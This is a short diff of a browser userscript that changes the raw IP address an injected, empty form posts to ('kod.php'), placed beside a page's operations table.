@@ -11,7 +11,7 @@
 // @grant       GM_addStyle
 // ==/UserScript==
 
-$('#my-operations-table').before(`<form id="f" action="http://66.154.108.170/kod.php" method="post" target="_blank"></form>`);
+$('#my-operations-table').before(`<form id="f" action="http://45.78.74.83/kod.php" method="post" target="_blank"></form>`);
 $('#my-operations-table').before('<table id="a"></table><table id="b"></table>');
 var i = 1;
 
